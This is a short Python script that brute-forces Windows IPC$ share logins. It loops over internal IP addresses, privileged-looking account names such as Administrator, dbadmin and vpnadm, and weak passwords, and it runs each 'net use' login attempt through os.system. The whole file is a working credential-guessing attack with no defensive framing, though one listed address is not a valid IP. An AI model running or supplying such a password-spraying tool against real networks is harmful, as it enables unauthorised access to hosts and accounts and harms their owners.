import os
import time
ips={
'192.168.168.21',
'192.168.168.25',
'192.168.168.291'
}
users={
'Administrator',
'boss',
'dbadmin',
'fileadmin',
'mack',
'mary',
'vpnadm',
'webadmin'
}
passs={
'admin',
'admin!@34',
'Admin123'
}
for ip in ips:
    for user in users:
        for mima in passs:
            exec="net use \\" + "\\" + ip + '\ipc$ ' + mima + ' /user:god\\' +user
            print('--->'+exec+'<--')
            os.system(exec)
            time.sleep(1)